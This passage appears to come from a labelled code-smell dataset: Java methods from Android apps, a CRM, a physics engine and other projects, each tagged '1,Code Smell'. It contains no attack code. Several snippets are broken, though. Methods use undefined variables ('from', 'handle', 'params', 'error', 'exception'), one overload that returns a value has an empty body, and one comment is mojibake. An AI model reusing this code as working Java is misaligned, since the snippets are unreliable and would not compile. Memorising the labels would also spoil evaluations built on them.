    if (newValue instanceof Set) {
      Set<?> values=((Set<?>)newValue);
      for (      OptionItem item : category.options) {
        boolean isSelected=false;
        for (        Object value : values) {
          isSelected=value.equals(item.toString());
          if (isSelected) {
            break;
          }
        }
        if (item.isSelected() != isSelected) {
          if (isSelected) {
            OptionItem[] requiredItems=item.getRequired();
            if (requiredItems != null) {
              for (              OptionItem requiredItem : requiredItems) {
                if (!requiredItem.isSelected()) {
                  MessageHelpers.showMessageThrottled(mContext,mContext.getString(R.string.require_checked,requiredItem.getTitle()));
                }
              }
            }
            OptionItem[] radioItems=item.getRadio();
            if (radioItems != null) {
              for (              OptionItem radioItem : radioItems) {
                radioItem.onSelect(false);
              }
              if (mOnChange != null) {
                mOnChange.run();
              }
            }
          }
          item.onSelect(isSelected);
          return true;
        }
      }
    }
    return false;
  }
);
}
",1,Code Smell
"private void onNavigateEnd(int fromPage,int toPage){
  if (fromPage == PAGE_CAMERA) {
    destroyCameraView(false);
    recordControl.setVisibility(View.GONE);
    zoomControlView.setVisibility(View.GONE);
    modeSwitcherView.setVisibility(View.GONE);
    dualButton.setVisibility(View.GONE);
    animateRecording(false,false);
    setAwakeLock(false);
  }
  cameraViewThumb.setClickable(toPage == PAGE_CAMERA);
  if (fromPage == PAGE_PREVIEW) {
    previewButtons.setVisibility(View.GONE);
    previewView.setVisibility(View.GONE);
    captionContainer.setVisibility(View.GONE);
    muteButton.setVisibility(View.GONE);
    playButton.setVisibility(View.GONE);
    downloadButton.setVisibility(View.GONE);
    if (themeButton != null) {
      themeButton.setVisibility(View.GONE);
    }
    previewView.setVisibility(View.GONE);
    timelineView.setVisibility(View.GONE);
    destroyPhotoPaintView();
    destroyPhotoFilterView();
    titleTextView.setVisibility(View.GONE);
    destroyGalleryListView();
    trash.setAlpha(0f);
    trash.setVisibility(View.GONE);
    videoTimeView.setVisibility(View.GONE);
  }
  if (toPage == PAGE_PREVIEW) {
    if (outputEntry == null || !outputEntry.isRepost) {
      createPhotoPaintView();
      hidePhotoPaintView();
    }
    if (outputEntry == null || !outputEntry.isRepost && !outputEntry.isRepostMessage) {
      createFilterPhotoView();
    }
    if (photoFilterEnhanceView != null) {
      photoFilterEnhanceView.setAllowTouch(false);
    }
    previewView.updatePauseReason(2,false);
    previewView.updatePauseReason(3,false);
    previewView.updatePauseReason(4,false);
    previewView.updatePauseReason(5,false);
    previewView.updatePauseReason(7,false);
    videoTimeView.setVisibility(outputEntry != null && outputEntry.duration >= 30_000 ? View.VISIBLE : View.GONE);
    captionContainer.setAlpha(1f);
    captionContainer.setTranslationY(0);
  }
  if (toPage == PAGE_CAMERA && showSavedDraftHint) {
    getDraftSavedHint().setVisibility(View.VISIBLE);
    getDraftSavedHint().show();
    recordControl.updateGalleryImage();
  }
  showSavedDraftHint=false;
  if (photoFilterEnhanceView != null) {
    photoFilterEnhanceView.setAllowTouch(toPage == PAGE_PREVIEW && (currentEditMode == EDIT_MODE_NONE || currentEditMode == EDIT_MODE_FILTER));
  }
  if (captionEdit != null) {
    captionEdit.ignoreTouches=toPage != PAGE_PREVIEW;
  }
  if (toPage == PAGE_PREVIEW) {
    MediaDataController.getInstance(currentAccount).checkStickers(MediaDataController.TYPE_IMAGE);
    MediaDataController.getInstance(currentAccount).loadRecents(MediaDataController.TYPE_IMAGE,false,true,false);
    MediaDataController.getInstance(currentAccount).loadRecents(MediaDataController.TYPE_FAVE,false,true,false);
    MessagesController.getInstance(currentAccount).getStoriesController().loadBlocklistAtFirst();
    MessagesController.getInstance(currentAccount).getStoriesController().loadSendAs();
  }
}",1,Code Smell
"@Override public void requestCheck(){
  if (userId == null || itemId == null || num == null || StringUtils.isBlank(checked)) {
    throw new ValidateException(ShoppingRetCode.REQUISITE_PARAMETER_NOT_EXIST.getCode(),ShoppingRetCode.REQUISITE_PARAMETER_NOT_EXIST.getMessage());
  }
}
",1,Code Smell
"public static CharSequence replaceSingleTag(String str,Runnable runnable){
  return replaceSingleTag(str,null,0,runnable);
}
public static CharSequence replaceSingleTag(String str,String colorKey,int type,Runnable runnable){
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public boolean isCompatible(DalvInsn insn){
  if (!(insn instanceof CstInsn)) {
    return false;
  }
  CstInsn ci=(CstInsn)insn;
  int cpi=ci.getIndex();
  if (!unsignedFitsInShort(cpi)) {
    return false;
  }
  Constant cst=ci.getConstant();
  if (!((cst instanceof CstMethodRef) || (cst instanceof CstType) || (cst instanceof CstCallSiteRef))) {
    return false;
  }
  RegisterSpecList regs=ci.getRegisters();
  return (wordCount(regs) >= 0);
}",1,Code Smell
"private static PhysicsResult stepPhysics(@NotNull BoundingBox boundingBox,@NotNull Vec velocity,@NotNull Pos entityPosition,@NotNull Block.Getter getter,boolean singleCollision){
  SweepResult finalResult=new SweepResult(1 - Vec.EPSILON,0,0,0,null,0,0,0,0,0,0);
  boolean foundCollisionX=false, foundCollisionY=false, foundCollisionZ=false;
  Point[] collidedPoints=new Point[3];
  Shape[] collisionShapes=new Shape[3];
  Point[] collisionShapePositions=new Point[3];
  boolean hasCollided=false;
  final Vec[] allFaces=calculateFaces(velocity,boundingBox);
  PhysicsResult result=computePhysics(boundingBox,velocity,entityPosition,getter,allFaces,finalResult);
  while (result.collisionX() || result.collisionY() || result.collisionZ()) {
    finalResult.normalX=0;
    finalResult.normalY=0;
    finalResult.normalZ=0;
    if (result.collisionX()) {
      foundCollisionX=true;
      collisionShapes[0]=finalResult.collidedShape;
      collisionShapePositions[0]=new Vec(finalResult.collidedShapeX,finalResult.collidedShapeY,finalResult.collidedShapeZ);
      collidedPoints[0]=new Vec(finalResult.collidedPositionX,finalResult.collidedPositionY,finalResult.collidedPositionZ);
      hasCollided=true;
      if (singleCollision)       break;
    }
 else     if (result.collisionZ()) {
      foundCollisionZ=true;
      collisionShapes[2]=finalResult.collidedShape;
      collisionShapePositions[2]=new Vec(finalResult.collidedShapeX,finalResult.collidedShapeY,finalResult.collidedShapeZ);
      collidedPoints[2]=new Vec(finalResult.collidedPositionX,finalResult.collidedPositionY,finalResult.collidedPositionZ);
      hasCollided=true;
      if (singleCollision)       break;
    }
 else     if (result.collisionY()) {
      foundCollisionY=true;
      collisionShapes[1]=finalResult.collidedShape;
      collisionShapePositions[1]=new Vec(finalResult.collidedShapeX,finalResult.collidedShapeY,finalResult.collidedShapeZ);
      collidedPoints[1]=new Vec(finalResult.collidedPositionX,finalResult.collidedPositionY,finalResult.collidedPositionZ);
      hasCollided=true;
      if (singleCollision)       break;
    }
    if (foundCollisionX && foundCollisionY && foundCollisionZ)     break;
    if (result.newVelocity().isZero())     break;
    finalResult.res=1 - Vec.EPSILON;
    result=computePhysics(boundingBox,result.newVelocity(),result.newPosition(),getter,allFaces,finalResult);
  }
  finalResult.res=result.res().res;
  final double newDeltaX=foundCollisionX ? 0 : velocity.x();
  final double newDeltaY=foundCollisionY ? 0 : velocity.y();
  final double newDeltaZ=foundCollisionZ ? 0 : velocity.z();
  return new PhysicsResult(result.newPosition(),new Vec(newDeltaX,newDeltaY,newDeltaZ),newDeltaY == 0 && velocity.y() < 0,foundCollisionX,foundCollisionY,foundCollisionZ,velocity,collidedPoints,collisionShapes,collisionShapePositions,hasCollided,finalResult);
}",1,Code Smell
"private void resendCodeFromSafetyNet(Bundle params,TLRPC.auth_SentCode res){
  if (!isRequestingFirebaseSms) {
    return;
  }
  needHideProgress(false);
  isRequestingFirebaseSms=false;
  TLRPC.TL_auth_resendCode req=new TLRPC.TL_auth_resendCode();
  req.phone_number=params.getString(""phoneFormated"");
  req.phone_code_hash=res.phone_code_hash;
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    if (response != null) {
      AndroidUtilities.runOnUIThread(() -> fillNextCodeParams(params,(TLRPC.auth_SentCode)response));
    }
 else {
      AndroidUtilities.runOnUIThread(() -> {
        if (getParentActivity() == null || getParentActivity().isFinishing() || getContext() == null) {
          return;
        }
        new AlertDialog.Builder(getContext()).setTitle(LocaleController.getString(R.string.RestorePasswordNoEmailTitle)).setMessage(LocaleController.getString(R.string.SafetyNetErrorOccurred)).setPositiveButton(LocaleController.getString(R.string.OK),(dialog,which) -> {
          forceDisableSafetyNet=true;
          if (currentViewNum != VIEW_PHONE_INPUT) {
            setPage(VIEW_PHONE_INPUT,true,null,true);
          }
        }
).show();
      }
);
    }
  }
,ConnectionsManager.RequestFlagFailOnServerErrors | ConnectionsManager.RequestFlagWithoutLogin);
}
",1,Code Smell
"@Override public void transferFieldList(List<OaExamineField> recordList,Integer isDetail){
  recordList.forEach(record -> {
    Integer dataType=record.getType();
    if (isDetail == 2) {
      if (FieldEnum.CHECKBOX.getType().equals(dataType)) {
        if (ObjectUtil.isNotEmpty(record.getValue())) {
          String[] split=StrUtil.split((String)record.getValue(),"","");
          record.setValue(split);
        }
      }
    }
    if (ObjectUtil.isNotEmpty(record.getValue())) {
      FieldEnum fieldEnum=FieldEnum.parse(dataType);
      record.setValue(fieldService.convertValueByFormType(record.getValue(),fieldEnum));
    }
  }
);
}",1,Code Smell
"@Override public void collectAdjacentPrefetchPositions(int fromLimit,int da,@NonNull RecyclerView.LayoutManager.LayoutPrefetchRegistry layoutPrefetchRegistry){
  int indexToPrefetch;
  int nearestEdge;
  if (mReversedFlow ? da > 0 : da < 0) {
    if (getFirstVisibleIndex() == 0) {
      return;
    }
    indexToPrefetch=getStartIndexForPrepend();
    nearestEdge=mProvider.getEdge(mFirstVisibleIndex) + (mReversedFlow ? mSpacing : -mSpacing);
  }
 else {
    if (getLastVisibleIndex() == mProvider.getCount() - 1) {
      return;
    }
    indexToPrefetch=getStartIndexForAppend();
    int itemSizeWithSpace=mProvider.getSize(mLastVisibleIndex) + mSpacing;
    nearestEdge=mProvider.getEdge(mLastVisibleIndex) + (mReversedFlow ? -itemSizeWithSpace : itemSizeWithSpace);
  }
  int distance=Math.abs(nearestEdge - fromLimit);
  layoutPrefetchRegistry.addPosition(indexToPrefetch,distance);
}",1,Code Smell
"private static void redirect(ClassNode classNode,ClassLoaderRemapper remapper){
  for (  MethodNode methodNode : classNode.methods) {
    for (    AbstractInsnNode insnNode : methodNode.instructions) {
      if (insnNode instanceof MethodInsnNode) {
        if (from.getOpcode() == Opcodes.INVOKESPECIAL && Objects.equals(from.owner,classNode.superName) && Objects.equals(from.name,methodNode.name) && Objects.equals(from.desc,methodNode.desc)) {
          continue;
        }
        process(from,methodNode.instructions,remapper,classNode);
      }
 else       if (insnNode.getOpcode() == Opcodes.INVOKEDYNAMIC) {
        InvokeDynamicInsnNode invokeDynamic=(InvokeDynamicInsnNode)insnNode;
        Object[] bsmArgs=invokeDynamic.bsmArgs;
        for (int i=0; i < bsmArgs.length; i++) {
          Object bsmArg=bsmArgs[i];
          if (bsmArg instanceof Handle) {
            if (toOpcode(handle.getTag()) != -1) {
              bsmArgs[i]=processHandle(handle,remapper);
            }
          }
        }
      }
    }
  }
}
private static void redirect(Class<?> owner,String name,String handlerName,Class<?>... args){
  addRule(false,owner,name,handlerName,args);
}",1,Code Smell
"@Override public SqlMonotonicity getMonotonicity(SqlOperatorBinding call){
  RelDataTypeFamily castFrom=call.getOperandType(0).getFamily();
  RelDataTypeFamily castTo=call.getOperandType(1).getFamily();
  if (castFrom instanceof SqlTypeFamily && castTo instanceof SqlTypeFamily && nonMonotonicCasts.containsEntry(castFrom,castTo)) {
    return SqlMonotonicity.NOT_MONOTONIC;
  }
 else {
    return call.getOperandMonotonicity(0);
  }
}",1,Code Smell
"public static String updateThumbnail(String thumbUrl,int thumbQuality){
  if (thumbUrl == null || thumbQuality == THUMB_QUALITY_DEFAULT) {
    return thumbUrl;
  }
  String quality=""hqdefault"";
switch (thumbQuality) {
case THUMB_QUALITY_START:
    quality=""hq1"";
  break;
case THUMB_QUALITY_MIDDLE:
quality=""hq2"";
break;
case THUMB_QUALITY_END:
quality=""hq3"";
break;
}
return Helpers.replace(thumbUrl,THUMB_QUALITY_PATTERN,""/"" + quality + ""."");
}
public static String updateThumbnail(Video video,int thumbQuality){
  if (video == null) {
    return null;
  }
  if (video.isLive || video.isUpcoming || video.altCardImageUrl != null) {
    return video.getCardImageUrl();
  }
  return updateThumbnail(video.getCardImageUrl(),thumbQuality);
}",1,Code Smell
"/** 
 * 璁剧疆鐘舵��
 * @param adminUserStatusBO status
 */
@Transactional(rollbackFor=Exception.class) @Override public void setUserStatus(AdminUserStatusBO adminUserStatusBO){
  for (  Long id : adminUserStatusBO.getIds()) {
    if (BaseStatusEnum.CLOSE.getStatus().equals(adminUserStatusBO.getStatus())) {
      if (id.equals(UserUtil.getSuperUser())) {
        throw new CrmException(AdminCodeEnum.ADMIN_SUPER_USER_DISABLED_ERROR);
      }
      UserUtil.userExit(id,null);
    }
 else     if (BaseStatusEnum.OPEN.getStatus().equals(adminUserStatusBO.getStatus())) {
      Integer roleCount=adminUserRoleService.lambdaQuery().eq(AdminUserRole::getUserId,id).count();
      if (roleCount == 0) {
        throw new CrmException(AdminCodeEnum.ADMIN_USER_NOT_ROLE_ERROR);
      }
      AdminUser adminUser=getById(id);
      if (adminUser.getDeptId() == null) {
        throw new CrmException(AdminCodeEnum.ADMIN_USER_NOT_DEPT_ERROR);
      }
    }
    lambdaUpdate().set(AdminUser::getStatus,adminUserStatusBO.getStatus()).eq(AdminUser::getUserId,id).update();
  }
}",1,Code Smell
"/** 
 * update volumes in string
 * @param updateDatas
 * @return
 */
private void updateVolumes(JSONArray updateDatas){
  JSONObject workloadSpec=(JSONObject)getWorkloadRef().getSpec();
  JSONArray volumes;
  if (workloadSpec.get(""cloneSet"") != null) {
    JSONObject cloneSetSpec=workloadSpec.getJSONObject(""cloneSet"").getJSONObject(""template"").getJSONObject(""spec"");
    volumes=cloneSetSpec.getJSONArray(""volumes"");
    if (volumes == null) {
      cloneSetSpec.put(""volumes"",new JSONArray());
      volumes=cloneSetSpec.getJSONArray(""volumes"");
    }
  }
 else   if (workloadSpec.get(""advancedStatefulSet"") != null) {
    JSONObject advancedStatefulSetSpec=workloadSpec.getJSONObject(""advancedStatefulSet"").getJSONObject(""template"").getJSONObject(""spec"");
    volumes=advancedStatefulSetSpec.getJSONArray(""volumes"");
    if (volumes == null) {
      advancedStatefulSetSpec.put(""volumes"",new JSONArray());
      volumes=advancedStatefulSetSpec.getJSONArray(""volumes"");
    }
  }
 else {
    throw new AppException(AppErrorCode.INVALID_USER_ARGS,""not supported"");
  }
  for (int i=0; i < updateDatas.size(); i++) {
    JSONObject updateData=updateDatas.getJSONObject(i);
    volumes.add(updateData);
  }
}",1,Code Smell
"private void parseHeaderExtension(){
  timeUs=0;
  if (ptsFlag) {
    pesScratch.skipBits(4);
    long pts=(long)pesScratch.readBits(3) << 30;
    pesScratch.skipBits(1);
    pts|=pesScratch.readBits(15) << 15;
    pesScratch.skipBits(1);
    pts|=pesScratch.readBits(15);
    pesScratch.skipBits(1);
    if (!seenFirstDts && dtsFlag) {
      pesScratch.skipBits(4);
      long dts=(long)pesScratch.readBits(3) << 30;
      pesScratch.skipBits(1);
      dts|=pesScratch.readBits(15) << 15;
      pesScratch.skipBits(1);
      dts|=pesScratch.readBits(15);
      pesScratch.skipBits(1);
      timestampAdjuster.adjustTsTimestamp(dts);
      seenFirstDts=true;
    }
    timeUs=timestampAdjuster.adjustTsTimestamp(pts);
  }
}",1,Code Smell
"@Override public ErrorCode action(ByteBuf ackPayload,String clientID,String fromUser,ProtoConstants.RequestSourceType requestSourceType,WFCMessage.CreateGroupRequest request,Qos1PublishHandler.IMCallback callback){
  if (request.getGroup().getGroupInfo().getType() < 0 || request.getGroup().getGroupInfo().getType() > 3) {
    return ErrorCode.ERROR_CODE_INVALID_DATA;
  }
  if (!StringUtil.isNullOrEmpty(request.getGroup().getGroupInfo().getTargetId())) {
    WFCMessage.GroupInfo existGroupInfo=m_messagesStore.getGroupInfo(request.getGroup().getGroupInfo().getTargetId());
    if (existGroupInfo != null && existGroupInfo.getDeleted() == 0) {
      return ErrorCode.ERROR_CODE_GROUP_ALREADY_EXIST;
    }
  }
  boolean isAdmin=requestSourceType == ProtoConstants.RequestSourceType.Request_From_Admin;
  if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0 && requestSourceType == ProtoConstants.RequestSourceType.Request_From_User && !m_messagesStore.isAllowClientCustomGroupNotification()) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0 && requestSourceType == ProtoConstants.RequestSourceType.Request_From_Robot && !m_messagesStore.isAllowRobotCustomGroupNotification()) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (!isAdmin && request.getGroup().getGroupInfo().getType() == ProtoConstants.GroupType.GroupType_Organization) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (requestSourceType == ProtoConstants.RequestSourceType.Request_From_User) {
    int forbiddenClientOperation=m_messagesStore.getGroupForbiddenClientOperation();
    if ((forbiddenClientOperation & ProtoConstants.ForbiddenClientGroupOperationMask.Forbidden_Create_Group) > 0) {
      return ErrorCode.ERROR_CODE_NOT_RIGHT;
    }
  }
  if (requestSourceType == ProtoConstants.RequestSourceType.Request_From_User) {
    ErrorCode errorCode=m_messagesStore.canAddGroupMembers(fromUser,request.getGroup().getMembersList());
    if (errorCode != ErrorCode.ERROR_CODE_SUCCESS) {
      return errorCode;
    }
  }
  WFCMessage.GroupInfo groupInfo=m_messagesStore.createGroup(fromUser,request.getGroup().getGroupInfo(),request.getGroup().getMembersList(),request.getMemberExtra(),isAdmin);
  if (groupInfo != null && groupInfo.getDeleted() == 0) {
    if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0) {
      sendGroupNotification(fromUser,groupInfo.getTargetId(),request.getToLineList(),request.getNotifyContent());
    }
 else {
      WFCMessage.MessageContent content=new GroupNotificationBinaryContent(groupInfo.getTargetId(),fromUser,groupInfo.getName(),"""").setExtra(request.getMemberExtra()).getCreateGroupNotifyContent();
      sendGroupNotification(fromUser,groupInfo.getTargetId(),request.getToLineList(),content);
    }
  }
  byte[] data=groupInfo.getTargetId().getBytes();
  ackPayload.ensureWritable(data.length).writeBytes(data);
  return ErrorCode.ERROR_CODE_SUCCESS;
}",1,Code Smell
"/** 
 * @param containerView 扩展view的container
 * @param conversation
 */
@ExtContextMenuItem public void pickImage(View containerView,Conversation conversation){
  String[] permissions=null;
  boolean isAccessFullOrPartialGranted=false;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (ContextCompat.checkSelfPermission(activity,Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(activity,Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED)) {
    isAccessFullOrPartialGranted=true;
  }
 else   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && ContextCompat.checkSelfPermission(activity,Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
    isAccessFullOrPartialGranted=true;
  }
 else   if (ContextCompat.checkSelfPermission(activity,Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
    isAccessFullOrPartialGranted=true;
  }
 else {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
      permissions=new String[]{Manifest.permission.READ_MEDIA_IMAGES,Manifest.permission.READ_MEDIA_VIDEO};
    }
 else {
      permissions=new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
    }
  }
  if (isAccessFullOrPartialGranted) {
    Intent intent=ImagePicker.picker().showCamera(true).enableMultiMode(9).buildPickIntent(activity);
    startActivityForResult(intent,100);
    TypingMessageContent content=new TypingMessageContent(TypingMessageContent.TYPING_CAMERA);
    messageViewModel.sendMessage(conversation,toUsers(),content);
  }
 else {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
      activity.requestPermissions(permissions,100);
    }
  }
}",1,Code Smell
"private void appendRemoveFromNotificationsButton(){
  if (mVideo == null || mVideo.mediaItem == null) {
    return;
  }
  if (!mVideo.belongsToNotifications() || !mIsRemoveFromSubscriptionsButtonEnabled) {
    return;
  }
  mDialogPresenter.appendSingleButton(UiOptionItem.from(getContext().getString(R.string.remove_from_subscriptions),optionItem -> {
    MediaServiceManager.instance().hideNotification(mVideo);
    if (mCallback != null) {
      mCallback.onItemAction(mVideo,VideoMenuCallback.ACTION_REMOVE);
    }
    mDialogPresenter.closeDialog();
  }
));
}
",1,Code Smell
"/** 
 * Handle an event that is not a functional event. <p> These events are generally events that cause input, but in some cases they may do other things like trigger an editor action.
 * @param event The event to handle.
 * @param inputTransaction The transaction in progress.
 */
private void handleNonFunctionalEvent(final Event event,final InputTransaction inputTransaction,final LatinIME.UIHandler handler){
  inputTransaction.setDidAffectContents();
  if (event.getMCodePoint() == Constants.CODE_ENTER) {
    final EditorInfo editorInfo=getCurrentInputEditorInfo();
    final int imeOptionsActionId=InputTypeUtils.getImeOptionsActionIdFromEditorInfo(editorInfo);
    if (InputTypeUtils.IME_ACTION_CUSTOM_LABEL == imeOptionsActionId) {
      performEditorAction(editorInfo.actionId);
    }
 else     if (EditorInfo.IME_ACTION_NONE != imeOptionsActionId) {
      performEditorAction(imeOptionsActionId);
    }
 else {
      handleNonSpecialCharacterEvent(event,inputTransaction,handler);
    }
  }
 else {
    handleNonSpecialCharacterEvent(event,inputTransaction,handler);
  }
}
",1,Code Smell
"/** 
 * 将CheckedException转换为UncheckedException.
 * @param e Throwable
 * @return {RuntimeException}
 */
public static RuntimeException unchecked(Throwable e){
  if (e instanceof Error) {
    throw error;
  }
 else   if (e instanceof IllegalAccessException || e instanceof IllegalArgumentException || e instanceof NoSuchMethodException) {
    return new IllegalArgumentException(e);
  }
 else   if (e instanceof InvocationTargetException) {
    return Exceptions.runtime(exception.getTargetException());
  }
 else   if (e instanceof RuntimeException) {
    return exception;
  }
 else   if (e instanceof InterruptedException) {
    Thread.currentThread().interrupt();
  }
  return Exceptions.runtime(e);
}
",1,Code Smell
"private void createMaskCanvas(int width,int height,int oldw,int oldh){
  boolean sizeChanged=width != oldw || height != oldh;
  if (width > 0 && height > 0 && (mMaskCanvas == null || sizeChanged)) {
    mMaskCanvas=new Canvas();
    mMaskBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);
    mMaskCanvas.setBitmap(mMaskBitmap);
    mMaskPaint.reset();
    paintMaskCanvas(mMaskCanvas,mMaskPaint,width,height);
    mDrawableCanvas=new Canvas();
    mDrawableBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);
    mDrawableCanvas.setBitmap(mDrawableBitmap);
    mDrawablePaint=new Paint(Paint.ANTI_ALIAS_FLAG);
    mDrawablePaint.setColor(mPaintColor);
    mInvalidated=true;
  }
}",1,Code Smell
"private void processType(ResolvableType type,InspectionCache cache,Consumer<TypeModel> callback){
  if (ResolvableType.NONE.equals(type) || cache.contains(type.toClass()) || !typeFilter.test(type.toClass())) {
    return;
  }
  TypeModel result=new TypeModel(type.toClass());
  cache.put(result.getType(),result);
  Set<Type> additionalTypes=new LinkedHashSet<>();
  additionalTypes.addAll(TypeUtils.resolveTypesInSignature(type));
  additionalTypes.addAll(visitConstructorsOfType(type,result));
  additionalTypes.addAll(visitMethodsOfType(type,result));
  additionalTypes.addAll(visitFieldsOfType(type,result));
  if (result.hasDeclaredClasses()) {
    additionalTypes.addAll(Arrays.asList(result.getType().getDeclaredClasses()));
  }
  callback.accept(result);
  for (  Type discoveredType : additionalTypes) {
    processType(ResolvableType.forType(discoveredType,type),cache,callback);
  }
}
",1,Code Smell
"public void setDetails(FileInfo details){
  this.details=new FileInfo[1];
  this.details[0]=details;
  System.out.println(""Extra: "" + details.getExtra());
  btnCalculate2.setEnabled(details.getType() == FileType.Directory || details.getType() == FileType.DirLink);
  this.permissions=details.getPermission();
  if (this.pattern != null && details.getExtra() != null && details.getExtra().length() > 0) {
    Matcher matcher=pattern.matcher(details.getExtra());
    if (matcher.find()) {
      String user=matcher.group(1);
      String group=matcher.group(2);
      txtOwner.setText(user);
      txtGroup.setText(group);
    }
  }
  this.txtModified.setText(details.getLastModified().format(DateTimeFormatter.ISO_DATE_TIME));
  this.txtName.setText(details.getName());
  this.txtPath.setText(details.getPath());
  this.txtSize.setText(details.getType() == FileType.Directory || details.getType() == FileType.DirLink ? ""---"" : FormatUtils.humanReadableByteCount(details.getSize(),true));
  this.txtType.setText(details.getType() == FileType.Directory || details.getType() == FileType.DirLink ? ""Directory"" : ""File"");
  boolean[] perms=extractPermissions(permissions);
  for (int i=0; i < 9; i++) {
    chkPermissons[i].setSelected(perms[i]);
  }
}",1,Code Smell
"public static void updateLayoutGravityOf(final View view,final int layoutGravity){
  final ViewGroup.LayoutParams lp=view.getLayoutParams();
  if (lp instanceof LinearLayout.LayoutParams) {
    if (params.gravity != layoutGravity) {
      params.gravity=layoutGravity;
      view.setLayoutParams(params);
    }
  }
 else   if (lp instanceof FrameLayout.LayoutParams) {
    if (params.gravity != layoutGravity) {
      params.gravity=layoutGravity;
      view.setLayoutParams(params);
    }
  }
 else {
    throw new IllegalArgumentException(""Layout parameter doesn't have gravity: "" + lp.getClass().getName());
  }
}
",1,Code Smell
"public static void validateConfig(Context context){
  if (TextUtils.isEmpty(Config.IM_SERVER_HOST) || Config.IM_SERVER_HOST.startsWith(""http"") || Config.IM_SERVER_HOST.contains("":"")|| TextUtils.isEmpty(APP_SERVER_ADDRESS)|| (!APP_SERVER_ADDRESS.startsWith(""http"") && !APP_SERVER_ADDRESS.startsWith(""https""))|| Config.IM_SERVER_HOST.equals(""127.0.0.1"")|| APP_SERVER_ADDRESS.contains(""127.0.0.1"")|| (!Config.IM_SERVER_HOST.contains(""wildfirechat.net"") && APP_SERVER_ADDRESS.contains(""wildfirechat.net""))|| (Config.IM_SERVER_HOST.contains(""wildfirechat.net"") && !APP_SERVER_ADDRESS.contains(""wildfirechat.net""))) {
    Toast.makeText(context,""配置错误，请检查配置，应用即将关闭..."",Toast.LENGTH_LONG).show();
    new Handler().postDelayed(() -> {
      throw new IllegalArgumentException(""config error\n 参数配置错误\n请仔细阅读配置相关注释，并检查配置!\n"");
    }
,5 * 1000);
  }
  if (Config.ICE_SERVERS != null) {
    for (    String[] ice : Config.ICE_SERVERS) {
      if (!ice[0].startsWith(""turn"")) {
        Toast.makeText(context,""Turn配置错误，请检查配置，应用即将关闭..."",Toast.LENGTH_LONG).show();
        new Handler().postDelayed(() -> {
          throw new IllegalArgumentException(""config error\n 参数配置错误\n请仔细阅读配置相关注释，并检查配置!\n"");
        }
,5 * 1000);
      }
    }
  }
  if (!BuildConfig.DEBUG && BuildConfig.APPLICATION_ID.startsWith(""cn.wildfire"")) {
    Toast.makeText(context,""上线时，请勿直接使用野火的包名！！！"",Toast.LENGTH_LONG).show();
  }
}",1,Code Smell
"@Override public Resource getLeftResource(){
  if (this.leftResource == null && getMaxResource() != null && getUsedResource() != null) {
    return getMaxResource().minus(getUsedResource());
  }
 else {
    return this.leftResource;
  }
}
",1,Code Smell
"private static byte[] adjustRequestInitData(UUID uuid,byte[] initData){
  if (C.PLAYREADY_UUID.equals(uuid)) {
    byte[] schemeSpecificData=PsshAtomUtil.parseSchemeSpecificData(initData,uuid);
    if (schemeSpecificData == null) {
      schemeSpecificData=initData;
    }
    initData=PsshAtomUtil.buildPsshAtom(C.PLAYREADY_UUID,addLaUrlAttributeIfMissing(schemeSpecificData));
  }
  if ((Util.SDK_INT < 21 && C.WIDEVINE_UUID.equals(uuid)) || (C.PLAYREADY_UUID.equals(uuid) && ""Amazon"".equals(Util.MANUFACTURER) && (""AFTB"".equals(Util.MODEL) || ""AFTS"".equals(Util.MODEL) || ""AFTM"".equals(Util.MODEL)))) {
    byte[] psshData=PsshAtomUtil.parseSchemeSpecificData(initData,uuid);
    if (psshData != null) {
      return psshData;
    }
  }
  return initData;
}",1,Code Smell
"/** 
 * Returns the size of utf8 encoded string in bytes. 
 */
private static int getUtf8Size(String string,MarshalerContext context){
  return getUtf8Size(string,context.marshalStringUnsafe());
}
static int getUtf8Size(String string,boolean useUnsafe){
  if (useUnsafe && UnsafeString.isAvailable() && UnsafeString.isLatin1(string)) {
    byte[] bytes=UnsafeString.getBytes(string);
    return string.length() + countNegative(bytes);
  }
  return encodedUtf8Length(string);
}",1,Code Smell
"private void extractFromBelt(float itemSpeed){
  if (itemSpeed <= 0 || level == null || level.isClientSide)   return;
  if (getItem().isEmpty() && beltBelow != null) {
    beltBelow.handleCenteredProcessingOnAllItems(.5f,ts -> {
      if (canAcceptItem(ts.stack)) {
        setItem(ts.stack.copy(),-beltBelowOffset);
        return TransportedResult.removeItem();
      }
      return TransportedResult.doNothing();
    }
);
  }
}",1,Code Smell
"private int addIndexItem(String indexItem,int argIndex,Object[] args){
  indexItem=indexItem.trim();
  Matcher m=ITEM_PATTERN.matcher(indexItem);
  if (!m.matches()) {
    throw new IllegalArgumentException(""Invalid argument index: "" + indexItem);
  }
  if (""null"".equals(indexItem)) {
    indices.add(new NDIndexNull());
    return argIndex;
  }
  String star=m.group(1);
  if (star != null) {
    indices.add(new NDIndexAll());
    return argIndex;
  }
  String digit=m.group(7);
  if (digit != null) {
    if (""{}"".equals(digit)) {
      Object arg=args[argIndex];
      if (arg instanceof Integer) {
        indices.add(new NDIndexFixed((Integer)arg));
        return argIndex + 1;
      }
 else       if (arg instanceof Long) {
        indices.add(new NDIndexFixed((Long)arg));
        return argIndex + 1;
      }
 else       if (arg instanceof NDArray) {
        NDArray array=(NDArray)arg;
        if (array.getDataType().isBoolean()) {
